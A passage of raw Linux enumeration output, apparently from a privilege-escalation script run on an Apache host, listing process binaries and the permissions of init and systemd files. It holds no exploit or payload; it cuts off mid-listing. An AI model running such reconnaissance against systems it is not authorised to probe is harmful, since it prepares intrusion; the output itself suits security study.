34424 2788 ? R 11:39 0:00 ps aux [00;31m[-] Process binaries and associated permissions (from above list):[00m -rwxr-xr-x 1 root root 326224 Jan 18 2017 /lib/systemd/systemd-journald -rwxr-xr-x 1 root root 618520 Jan 18 2017 /lib/systemd/systemd-logind -rwxr-xr-x 1 root root 141904 Jan 18 2017 /lib/systemd/systemd-timesyncd -rwxr-xr-x 1 root root 453240 Jan 18 2017 /lib/systemd/systemd-udevd -rwxr-xr-x 1 root root 44104 Dec 16 2016 /sbin/agetty lrwxrwxrwx 1 root root 20 Dec 4 2017 /sbin/init -\u0026gt; /lib/systemd/systemd -rwxr-xr-x 1 root root 224208 Jan 12 2017 /usr/bin/dbus-daemon -rwxr-xr-x 1 root root 44528 Feb 9 2017 /usr/bin/vmtoolsd -rwxr-xr-x 1 root root 164928 Nov 3 2016 /usr/lib/accountsservice/accounts-daemon -rwxr-xr-x 1 root root 662496 Sep 18 2017 /usr/sbin/apache2 -rwxr-xr-x 1 root root 44472 Apr 5 2016 /usr/sbin/cron -rwxr-xr-x 1 root root 599328 Apr 5 2016 /usr/sbin/rsyslogd [00;31m[-] /etc/init.d/ binary permissions:[00m total 252 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 1355 Dec 4 2017 .depend.boot -rw-r--r-- 1 root root 471 Dec 4 2017 .depend.start -rw-r--r-- 1 root root 667 Dec 4 2017 .depend.stop -rw-r--r-- 1 root root 2427 Jan 19 2016 README -rwxr-xr-x 1 root root 2210 Apr 5 2016 apache-htcacheclean -rwxr-xr-x 1 root root 8087 Apr 5 2016 apache2 -rwxr-xr-x 1 root root 6250 Oct 4 2016 apparmor -rwxr-xr-x 1 root root 1275 Jan 19 2016 bootmisc.sh -rwxr-xr-x 1 root root 3807 Jan 19 2016 checkfs.sh -rwxr-xr-x 1 root root 1098 Jan 19 2016 checkroot-bootclean.sh -rwxr-xr-x 1 root root 9353 Jan 19 2016 checkroot.sh -rwxr-xr-x 1 root root 1343 Apr 4 2016 console-setup -rwxr-xr-x 1 root root 3049 Apr 5 2016 cron -rwxr-xr-x 1 root root 2813 Dec 1 2015 dbus -rwxr-xr-x 1 root root 1105 Mar 15 2016 grub-common -rwxr-xr-x 1 root root 1336 Jan 19 2016 halt -rwxr-xr-x 1 root root 1423 Jan 19 2016 hostname.sh -rwxr-xr-x 1 root root 3809 Mar 12 2016 hwclock.sh -rwxr-xr-x 1 root root 2372 Apr 11 2016 irqbalance -rwxr-xr-x 1 root root 1804 Apr 4 2016 keyboard-setup -rwxr-xr-x 1 root root 1300 Jan 19 2016 killprocs -rwxr-xr-x 1 root root 2087 Dec 20 2015 kmod -rwxr-xr-x 1 root root 703 Jan 19 2016 mountall-bootclean.sh -rwxr-xr-x 1 root root 2301 Jan 19 2016 mountall.sh -rwxr-xr-x 1 root root 1461 Jan 19 2016 mountdevsubfs.sh -rwxr-xr-x 1 root root 1564 Jan 19 2016 mountkernfs.sh -rwxr-xr-x 1 root root 711 Jan 19 2016 mountnfs-bootclean.sh -rwxr-xr-x 1 root root 2456 Jan 19 2016 mountnfs.sh -rwxr-xr-x 1 root root 4771 Jul 19 2015 networking -rwxr-xr-x 1 root root 1581 Oct 15 2015 ondemand -rwxr-xr-x 1 root root 1578 Sep 17 2016 open-vm-tools -rwxr-xr-x 1 root root 1366 Nov 15 2015 plymouth -rwxr-xr-x 1 root root 752 Nov 15 2015 plymouth-log -rwxr-xr-x 1 root root 1192 Sep 5 2015 procps -rwxr-xr-x 1 root root 6366 Jan 19 2016 rc -rwxr-xr-x 1 root root 820 Jan 19 2016 rc.local -rwxr-xr-x 1 root root 117 Jan 19 2016 rcS -rwxr-xr-x 1 root root 661 Jan 19 2016 reboot -rwxr-xr-x 1 root root 4149 Nov 23 2015 resolvconf -rwxr-xr-x 1 root root 4355 Jul 10 2014 rsync -rwxr-xr-x 1 root root 2796 Feb 3 2016 rsyslog -rwxr-xr-x 1 root root 3927 Jan 19 2016 sendsigs -rwxr-xr-x 1 root root 597 Jan 19 2016 single -rw-r--r-- 1 root root 1087 Jan 19 2016 skeleton -rwxr-xr-x 1 root root 6087 Apr 12 2016 udev -rwxr-xr-x 1 root root 2049 Aug 7 2014 ufw -rwxr-xr-x 1 root root 2737 Jan 19 2016 umountfs -rwxr-xr-x 1 root root 2202 Jan 19 2016 umountnfs.sh -rwxr-xr-x 1 root root 1879 Jan 19 2016 umountroot -rwxr-xr-x 1 root root 3111 Jan 19 2016 urandom -rwxr-xr-x 1 root root 1306 Dec 16 2016 uuidd -rwxr-xr-x 1 root root 2757 Nov 10 2015 x11-common [00;31m[-] /etc/init/ config file permissions:[00m total 124 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 3735 Oct 4 2016 apparmor.conf -rw-r--r-- 1 root root 250 Apr 4 2016 console-font.conf -rw-r--r-- 1 root root 509 Apr 4 2016 console-setup.conf -rw-r--r-- 1 root root 297 Apr 5 2016 cron.conf -rw-r--r-- 1 root root 482 Sep 1 2015 dbus.conf -rw-r--r-- 1 root root 1247 Jun 1 2015 friendly-recovery.conf -rw-r--r-- 1 root root 284 Jul 23 2013 hostname.conf -rw-r--r-- 1 root root 300 May 21 2014 hostname.sh.conf -rw-r--r-- 1 root root 561 Mar 14 2016 hwclock-save.conf -rw-r--r-- 1 root root 674 Mar 14 2016 hwclock.conf -rw-r--r-- 1 root root 109 Mar 14 2016 hwclock.sh.conf -rw-r--r-- 1 root root 597 Apr 11 2016 irqbalance.conf -rw-r--r-- 1 root root 689 Aug 20 2015 kmod.conf -rw-r--r-- 1 root root 530 Jun 2 2015 network-interface-container.conf -rw-r--r-- 1 root root 1756 Jun 2 2015 network-interface-security.conf -rw-r--r-- 1 root root 933 Jun 2 2015 network-interface.conf -rw-r--r-- 1 root root 2493 Jun 2 2015 networking.conf -rw-r--r-- 1 root root 568 Feb 1 2016 passwd.conf -rw-r--r-- 1 root root 363 Jun 5 2014 procps-instance.conf -rw-r--r-- 1 root root 119 Jun 5 2014 procps.conf -rw-r--r-- 1 root root 457 Jun 3 2015 resolvconf.conf -rw-r--r-- 1 root root 426 Dec 2 2015 rsyslog.conf -rw-r--r-- 1 root root 230 Apr 4 2016 setvtrgb.conf -rw-r--r-- 1 root root 337 Apr 12 2016 udev.conf -rw-r--r-- 1 root root 360 Apr 12 2016 udevmonitor.conf -rw-r--r-- 1 root root 352 Apr 12 2016 udevtrigger.conf -rw-r--r-- 1 root root 473 Aug 7 2014 ufw.conf -rw-r--r-- 1 root root 683 Feb 24 2015 ureadahead-other.conf -rw-r--r-- 1 root root 889 Feb 24 2015 ureadahead.conf [00;31m[-] /lib/systemd/* config file permissions:[00m /lib/systemd/: total 8.2M drwxr-xr-x 26 root root 12K Dec 4 2017 system drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-sleep drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-preset drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-generators drwxr-xr-x 2 root root 4.0K Dec 4 2017 network -rwxr-xr-x 1 root root 443K Jan 18 2017 systemd-udevd -rwxr-xr-x 1 root root 15K Jan 18 2017 systemd-ac-power -rwxr-xr-x 1 root root 47K Jan 18 2017 systemd-binfmt -rwxr-xr-x 1 root root 103K Jan 18 2017 systemd-bootchart -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-cryptsetup -rwxr-xr-x 1 root root 75K Jan 18 2017 systemd-fsckd -rwxr-xr-x 1 root root 276K Jan 18 2017 systemd-initctl -rwxr-xr-x 1 root root 824K Jan 18 2017 systemd-networkd -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-quotacheck -rwxr-xr-x 1 root root 657K Jan 18 2017 systemd-resolved -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-user-sessions -rwxr-xr-x 1 root root 55K Jan 18 2017 systemd-activate -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-backlight -rwxr-xr-x 1 root root 352K Jan 18 2017 systemd-bus-proxyd -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-hibernate-resume -rwxr-xr-x 1 root root 340K Jan 18 2017 systemd-localed -rwxr-xr-x 1 root root 605K Jan 18 2017 systemd-logind -rwxr-xr-x 1 root root 123K Jan 18 2017 systemd-networkd-wait-online -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-random-seed -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-reply-password -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-rfkill -rwxr-xr-x 1 root root 143K Jan 18 2017 systemd-shutdown -rwxr-xr-x 1 root root 71K Jan 18 2017 systemd-sleep -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-sysctl -rwxr-xr-x 1 root root 333K Jan 18 2017 systemd-timedated -rwxr-xr-x 1 root root 139K Jan 18 2017 systemd-timesyncd -rwxr-xr-x 1 root root 276K Jan 18 2017 systemd-update-utmp -rwxr-xr-x 1 root root 1.6M Jan 18 2017 systemd -rwxr-xr-x 1 root root 268K Jan 18 2017 systemd-cgroups-agent -rwxr-xr-x 1 root root 301K Jan 18 2017 systemd-fsck -rwxr-xr-x 1 root root 332K Jan 18 2017 systemd-hostnamed -rwxr-xr-x 1 root root 319K Jan 18 2017 systemd-journald -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-modules-load -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-remount-fs -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-socket-proxyd -rwxr-xr-x 1 root root 1.3K Jan 12 2017 systemd-sysv-install drwxr-xr-x 2 root root 4.0K Apr 12 2016 system-shutdown /lib/systemd/system: total 792K drwxr-xr-x 2 root root 4.0K Dec 4 2017 apache2.service.d drwxr-xr-x 2 root root 4.0K Dec 4 2017 halt.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 initrd-switch-root.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 kexec.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 multi-user.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 poweroff.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 reboot.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 sysinit.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 sockets.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 timers.target.wants lrwxrwxrwx 1 root root 21 Dec 4 2017 udev.service -\u0026gt; systemd-udevd.service lrwxrwxrwx 1 root root 9 Dec 4 2017 umountfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 umountnfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 umountroot.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 27 Dec 4 2017 urandom.service -\u0026gt; systemd-random-seed.service lrwxrwxrwx 1 root root 9 Dec 4 2017 x11-common.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 systemd-timesyncd.service.d lrwxrwxrwx 1 root root 9 Dec 4 2017 sendsigs.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 sigpwr.target.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 single.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 stop-bootlogd-single.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 stop-bootlogd.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 rescue.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 resolvconf.service.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 rmnologin.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 15 Dec 4 2017 runlevel0.target -\u0026gt; poweroff.target lrwxrwxrwx 1 root root 13 Dec 4 2017 runlevel1.target -\u0026gt; rescue.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel2.target -\u0026gt; multi-user.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel3.target -\u0026gt; multi-user.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel4.target -\u0026gt; multi-user.target lrwxrwxrwx 1 root root 16 Dec 4 2017 runlevel5.target -\u0026gt; graphical.target lrwxrwxrwx 1 root root 13 Dec 4 2017 runlevel6.target -\u0026gt; reboot.target lrwxrwxrwx 1 root root 22 Dec 4 2017 procps.service -\u0026gt; systemd-sysctl.service drwxr-xr-x 2 root root 4.0K Dec 4 2017 rc-local.service.d lrwxrwxrwx 1 root root 16 Dec 4 2017 rc.local.service -\u0026gt; rc-local.service lrwxrwxrwx 1 root root 9 Dec 4 2017 rc.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 rcS.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 reboot.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 graphical.target.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 halt.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 hostname.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 hwclock.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 killprocs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 28 Dec 4 2017 kmod.service -\u0026gt; systemd-modules-load.service drwxr-xr-x 2 root root 4.0K Dec 4 2017 local-fs.target.wants lrwxrwxrwx 1 root root 28 Dec 4 2017 module-init-tools.service -\u0026gt; systemd-modules-load.service lrwxrwxrwx 1 root root 9 Dec 4 2017 motd.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountall-bootclean.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountall.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountdevsubfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountkernfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountnfs-bootclean.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountnfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 16 Dec 4 2017 default.target -\u0026gt; graphical.target lrwxrwxrwx 1 root root 9 Dec 4 2017 fuse.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 getty.target.wants lrwxrwxrwx 1 root root 14 Dec 4 2017 autovt@.service -\u0026gt; getty@.service lrwxrwxrwx 1 root root 9 Dec 4 2017 bootlogd.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 bootlogs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 bootmisc.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkroot-bootclean.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkroot.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 cryptdisks-early.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 cryptdisks.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 13 Dec 4 2017 ctrl-alt-del.target -\u0026gt; reboot.target lrwxrwxrwx 1 root root 25 Dec 4 2017 dbus-org.freedesktop.hostname1.service -\u0026gt; systemd-hostnamed.service lrwxrwxrwx 1 root root 23 Dec 4 2017 dbus-org.freedesktop.locale1.service -\u0026gt; systemd-localed.service lrwxrwxrwx 1 root root 22 Dec 4 2017 dbus-org.freedesktop.login1.service -\u0026gt; systemd-logind.service lrwxrwxrwx 1 root root 24 Dec 4 2017 dbus-org.freedesktop.network1.service -\u0026gt; systemd-networkd.service lrwxrwxrwx 1 root root 24 Dec 4 2017 dbus-org.freedesktop.resolve1.service -\u0026gt; systemd-resolved.service lrwxrwxrwx 1 root root 25 Dec 4 2017 dbus-org.freedesktop.timedate1.service -\u0026gt; systemd-timedated.service drwxr-xr-x 2 root root 4.0K Feb 15 2017 busnames.target.wants -rw-r--r-- 1 root root 460 Feb 9 2017 run-vmblock-fuse.mount -rw-r--r-- 1 root root 269 Jan 31 2017 setvtrgb.service -rw-r--r-- 1 root root 770 Jan 18 2017 console-getty.service -rw-r--r-- 1 root root 742 Jan 18 2017 console-shell.service -rw-r--r-- 1 root root 791 Jan 18 2017 container-getty@.service -rw-r--r-- 1 root root 1010 Jan 18 2017 debug-shell.service -rw-r--r-- 1 root root 1009 Jan 18 2017 emergency.service -rw-r--r-- 1 root root 1.5K Jan 18 2017 getty@.service -rw-r--r-- 1 root root 630 Jan 18 2017 initrd-cleanup.service -rw-r--r-- 1 root root 790 Jan 18 2017 initrd-parse-etc.service -rw-r--r-- 1 root root 640 Jan 18 2017 initrd-switch-root.service -rw-r--r-- 1 root root 664 Jan 18 2017 initrd-udevadm-cleanup-db.service -rw-r--r-- 1 root root 677 Jan 18 2017 kmod-static-nodes.service -rw-r--r-- 1 root root 473 Jan 18 2017 mail-transport-agent.target -rw-r--r-- 1 root root 568 Jan 18 2017 quotaon.service -rw-r--r-- 1 root root 612 Jan 18 2017 rc-local.service -rw-r--r-- 1 root root 978 Jan 18 2017 rescue.service -rw-r--r-- 1 root root 1.1K Jan 18 2017 serial-getty@.service -rw-r--r-- 1 root root 653 Jan 18 2017 systemd-ask-password-console.service -rw-r--r-- 1 root root 681 Jan 18 2017 systemd-ask-password-wall.service -rw-r--r-- 1 root root 724 Jan 18 2017 systemd-backlight@.service -rw-r--r-- 1 root root 959 Jan 18 2017 systemd-binfmt.service -rw-r--r-- 1 root root 650 Jan 18 2017 systemd-bootchart.service -rw-r--r-- 1 root root 1.0K Jan 18 2017 systemd-bus-proxyd.service -rw-r--r-- 1 root root 497 Jan 18 2017 systemd-exit.service -rw-r--r-- 1 root root 674 Jan 18 2017 systemd-fsck-root.service -rw-r--r-- 1 root root 648 Jan 18 2017 systemd-fsck@.service -rw-r--r-- 1 root root 551 Jan 18 2017 systemd-fsckd.service -rw-r--r-- 1 root root 544 Jan 18 2017 systemd-halt.service -rw-r--r-- 1 root root 631 Jan 18 2017 systemd-hibernate-resume@.service -rw-r--r-- 1 root root 501 Jan 18 2017 systemd-hibernate.service -rw-r--r-- 1 root root 710 Jan 18 2017 systemd-hostnamed.service -rw-r--r-- 1 root root 778 Jan 18 2017 systemd-hwdb-update.service -rw-r--r-- 1 root root 519 Jan 18 2017 systemd-hybrid-sleep.service -rw-r--r-- 1 root root 480 Jan 18 2017 systemd-initctl.service -rw-r--r-- 1 root root 731 Jan 18 2017 systemd-journal-flush.service -rw-r--r-- 1 root root 1.3K Jan 18 2017 systemd-journald.service -rw-r--r-- 1 root root 557 Jan 18 2017 systemd-kexec.service -rw-r--r-- 1 root root 691 Jan 18 2017 systemd-localed.service -rw-r--r-- 1 root root 1.2K Jan 18 2017 systemd-logind.service -rw-r--r-- 1 root root 693 Jan 18 2017 systemd-machine-id-commit.service -rw-r--r-- 1 root root 967 Jan 18 2017 systemd-modules-load.service -rw-r--r-- 1 root root 685 Jan 18 2017 systemd-networkd-wait-online.service -rw-r--r-- 1 root root 1.3K Jan 18 2017 systemd-networkd.service -rw-r--r-- 1 root root 553 Jan 18 2017 systemd-poweroff.service -rw-r--r-- 1 root root 614 Jan 18 2017 systemd-quotacheck.service -rw-r--r-- 1 root root 717 Jan 18 2017 systemd-random-seed.service -rw-r--r-- 1 root root 548 Jan 18 2017 systemd-reboot.service -rw-r--r-- 1 root root 757 Jan 18 2017 systemd-remount-fs.service -rw-r--r-- 1 root root 907 Jan 18 2017 systemd-resolved.service -rw-r--r-- 1 root root 696 Jan 18 2017 systemd-rfkill.service -rw-r--r-- 1 root root 497 Jan 18 2017 systemd-suspend.service -rw-r--r-- 1 root root 649 Jan 18 2017 systemd-sysctl.service -rw-r--r-- 1 root root 655 Jan 18 2017 systemd-timedated.service -rw-r--r-- 1 root root 1.1K Jan 18 2017 systemd-timesyncd.service -rw-r--r-- 1 root root 598 Jan 18 2017 systemd-tmpfiles-clean.service -rw-r--r-- 1 root root 703 Jan 18 2017 systemd-tmpfiles-setup-dev.service -rw-r--r-- 1 root root 683 Jan 18 2017 systemd-tmpfiles-setup.service -rw-r--r-- 1 root root 823 Jan 18 2017 systemd-udev-settle.service -rw-r--r-- 1 root root 743 Jan 18 2017 systemd-udev-trigger.service -rw-r--r-- 1 root root 825 Jan 18 2017 systemd-udevd.service -rw-r--r-- 1 root root 757 Jan 18 2017 systemd-update-utmp-runlevel.service -rw-r--r-- 1 root root 754 Jan 18 2017 systemd-update-utmp.service -rw-r--r-- 1 root root 573 Jan 18 2017 systemd-user-sessions.service -rw-r--r-- 1 root root 528 Jan 18 2017 user@.service -rw-r--r-- 1 root root 403 Jan 18 2017 -.slice -rw-r--r-- 1 root root 879 Jan 18 2017 basic.target -rw-r--r-- 1 root root 379 Jan 18 2017 bluetooth.target -rw-r--r-- 1 root root 358 Jan 18 2017 busnames.target -rw-r--r-- 1 root root 394 Jan 18 2017 cryptsetup-pre.target -rw-r--r-- 1 root root 366 Jan 18 2017 cryptsetup.target -rw-r--r-- 1 root root 670 Jan 18 2017 dev-hugepages.mount -rw-r--r-- 1 root root 624 Jan 18 2017 dev-mqueue.mount -rw-r--r-- 1 root root 431 Jan 18 2017 emergency.target -rw-r--r-- 1 root root 501 Jan 18 2017 exit.target -rw-r--r-- 1 root root 440 Jan 18 2017 final.target -rw-r--r-- 1 root root 460 Jan 18 2017 getty.target -rw-r--r-- 1 root root 558 Jan 18 2017 graphical.target -rw-r--r-- 1 root root 487 Jan 18 2017 halt.target -rw-r--r-- 1 root root 447 Jan 18 2017 hibernate.target -rw-r--r-- 1 root root 468 Jan 18 2017 hybrid-sleep.target -rw-r--r-- 1 root root 553 Jan 18 2017 initrd-fs.target -rw-r--r-- 1 root root 526 Jan 18 2017 initrd-root-fs.target -rw-r--r-- 1 root root 691 Jan 18 2017 initrd-switch-root.target -rw-r--r-- 1 root root 671 Jan 18 2017 initrd.target -rw-r--r-- 1 root root 501 Jan 18 2017 kexec.target -rw-r--r-- 1 root root 395 Jan 18 2017 local-fs-pre.target -rw-r--r-- 1 root root 507 Jan 18 2017 local-fs.target -rw-r--r-- 1 root root 405 Jan 18 2017 machine.slice -rw-r--r-- 1 root root 492 Jan 18 2017 multi-user.target -rw-r--r-- 1 root root 464 Jan 18 2017 network-online.target -rw-r--r-- 1 root root 461 Jan 18 2017 network-pre.target -rw-r--r-- 1 root root 480 Jan 18 2017 network.target -rw-r--r-- 1 root root 514 Jan 18 2017 nss-lookup.target -rw-r--r-- 1 root root 473 Jan 18 2017 nss-user-lookup.target -rw-r--r-- 1 root root 354 Jan 18 2017 paths.target -rw-r--r-- 1 root root 552 Jan 18 2017 poweroff.target -rw-r--r-- 1 root root 377 Jan 18 2017 printer.target -rw-r--r-- 1 root root 693 Jan 18 2017 proc-sys-fs-binfmt_misc.automount -rw-r--r-- 1 root root 603 Jan 18 2017 proc-sys-fs-binfmt_misc.mount -rw-r--r-- 1 root root 543 Jan 18 2017 reboot.target -rw-r--r-- 1 root root 396 Jan 18 2017 remote-fs-pre.target -rw-r--r-- 1 root root 482 Jan 18 2017 remote-fs.target -rw-r--r-- 1 root root 486 Jan 18 2017 rescue.target -rw-r--r-- 1 root root 500 Jan 18 2017 rpcbind.target -rw-r--r-- 1 root root 402 Jan 18 2017 shutdown.target -rw-r--r-- 1 root root 362 Jan 18 2017 sigpwr.target -rw-r--r-- 1 root root 420 Jan 18 2017 sleep.target -rw-r--r-- 1 root root 409 Jan 18 2017 slices.target -rw-r--r-- 1 root root 380 Jan 18 2017 smartcard.target -rw-r--r-- 1 root root 356 Jan 18 2017 sockets.target -rw-r--r-- 1 root root 380 Jan 18 2017 sound.target -rw-r--r-- 1 root root 441 Jan 18 2017 suspend.target -rw-r--r-- 1 root root 353 Jan 18 2017 swap.target -rw-r--r-- 1 root root 715 Jan 18 2017 sys-fs-fuse-connections.mount -rw-r--r-- 1 root root 719 Jan 18 2017 sys-kernel-config.mount -rw-r--r-- 1 root root 662 Jan 18 2017 sys-kernel-debug.mount -rw-r--r-- 1 root root 518 Jan 18 2017 sysinit.target -rw-r--r-- 1 root root 1.3K Jan 18 2017 syslog.socket -rw-r--r-- 1 root root 585 Jan 18 2017 system-update.target -rw-r--r-- 1 root root 436 Jan 18 2017 system.slice -rw-r--r-- 1 root root 646 Jan 18 2017 systemd-ask-password-console.path -rw-r--r-- 1 root root 574 Jan 18 2017 systemd-ask-password-wall.path -rw-r--r-- 1 root root 409 Jan 18 2017 systemd-bus-proxyd.socket -rw-r--r-- 1 root root 540 Jan 18 2017 systemd-fsckd.socket -rw-r--r-- 1 root root 524 Jan 18 2017 systemd-initctl.socket -rw-r--r-- 1 root root 607 Jan 18 2017 systemd-journald-audit.socket -rw-r--r-- 1 root root 1.1K Jan 18 2017 systemd-journald-dev-log.socket -rw-r--r-- 1 root root 842 Jan 18 2017 systemd-journald.socket -rw-r--r-- 1 root root 591 Jan 18 2017 systemd-networkd.socket -rw-r--r-- 1 root root 617 Jan 18 2017 systemd-rfkill.socket -rw-r--r-- 1 root root 450 Jan 18 2017 systemd-tmpfiles-clean.timer -rw-r--r-- 1 root root 578 Jan 18 2017 systemd-udevd-control.socket -rw-r--r-- 1 root root 570 Jan 18 2017 systemd-udevd-kernel.socket -rw-r--r-- 1 root root 395 Jan 18 2017 time-sync.target -rw-r--r-- 1 root root 405 Jan 18 2017 timers.target -rw-r--r-- 1 root root 417 Jan 18 2017 umount.target -rw-r--r-- 1 root root 392 Jan 18 2017 user.slice -rw-r--r-- 1 root root 663 Jan 18 2017 systemd-networkd-resolvconf-update.service -rw-r--r-- 1 root root 153 Jan 17 2017 apt-daily.service -rw-r--r-- 1 root root 162 Jan 17 2017 apt-daily.timer -rw-r--r-- 1 root root 342 Jan 13 2017 getty-static.service -rw-r--r-- 1 root root 153 Jan 13 2017 sigpwr-container-shutdown.service -rw-r--r-- 1 root root 152 Jan 13 2017 systemd-networkd-resolvconf-update.path -rw-r--r-- 1 root root 491 Jan 12 2017 dbus.service -rw-r--r-- 1 root root 106 Jan 12 2017 dbus.socket -rw-r--r-- 1 root root 189 Dec 16 2016 uuidd.service -rw-r--r-- 1 root root 126 Dec 16 2016 uuidd.socket -rw-r--r-- 1 root root 735 Nov 30 2016 networking.service -rw-r--r-- 1 root root 497 Nov 30 2016 ifup@.service -rw-r--r-- 1 root root 631 Nov 3 2016 accounts-daemon.service -rw-r--r-- 1 root root 251 Sep 17 2016 open-vm-tools.service -rw-r--r-- 1 root root 285 Jun 16 2016 keyboard-setup.service -rw-r--r-- 1 root root 288 Jun 16 2016 console-setup.service lrwxrwxrwx 1 root root 27 May 10 2016 plymouth-log.service -\u0026gt; plymouth-read-write.service lrwxrwxrwx 1 root root 21 May 10 2016 plymouth.service -\u0026gt; plymouth-quit.service -rw-r--r-- 1 root root 412 May 10 2016 plymouth-halt.service -rw-r--r-- 1 root root 426 May 10 2016 plymouth-kexec.service -rw-r--r-- 1 root root 421 May 10 2016 plymouth-poweroff.service -rw-r--r-- 1 root root 200 May 10 2016 plymouth-quit-wait.service -rw-r--r-- 1 root root 194 May 10 2016 plymouth-quit.service -rw-r--r-- 1 root root 244 May 10 2016 plymouth-read-write.service -rw-r--r-- 1 root root 416 May 10 2016 plymouth-reboot.service -rw-r--r-- 1 root root 532 May 10 2016 plymouth-start.service -rw-r--r-- 1 root root 291 May 10 2016 plymouth-switch-root.service -rw-r--r-- 1 root root 490 May 10 2016 systemd-ask-password-plymouth.path -rw-r--r-- 1 root root 467 May 10 2016 systemd-ask-password-plymouth.service drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel1.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel2.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel3.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel4.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel5.target.wants -rw-r--r-- 1 root root 251 Apr 5 2016 cron.service -rw-r--r-- 1 root root 290 Apr 5 2016 rsyslog.service -rw-r--r-- 1 root root 395 Jun 3 2015 resolvconf.service -rw-r--r-- 1 root root 790 Jun 1 2015 friendly-recovery.service -rw-r--r-- 1 root root 241 Mar 2 2015 ufw.service -rw-r--r-- 1 root root 250 Feb 24 2015 ureadahead-stop.service -rw-r--r-- 1 root root 242 Feb 24 2015 ureadahead-stop.timer -rw-r--r-- 1 root root 401 Feb 24 2015 ureadahead.service -rw-r--r-- 1 root root 188 Feb 24 2014 rsync.service /lib/systemd/system/apache2.service.d: total 4.0K -rw-r--r-- 1 root root 42 Apr 12 2016 apache2-systemd.conf /lib/systemd/system/halt.target.wants: total 0 lrwxrwxrwx 1 root root 24 May 10 2016 plymouth-halt.service -\u0026gt; ../plymouth-halt.service /lib/systemd/system/initrd-switch-root.target.wants: total 0 lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-start.service -\u0026gt; ../plymouth-start.service lrwxrwxrwx 1 root root 31 May 10 2016 plymouth-switch-root.service -\u0026gt; ../plymouth-switch-root.service /lib/systemd/system/kexec.target.wants: total 0 lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-kexec.service -\u0026gt; ../plymouth-kexec.service /lib/systemd/system/multi-user.target.wants: total 0 lrwxrwxrwx 1 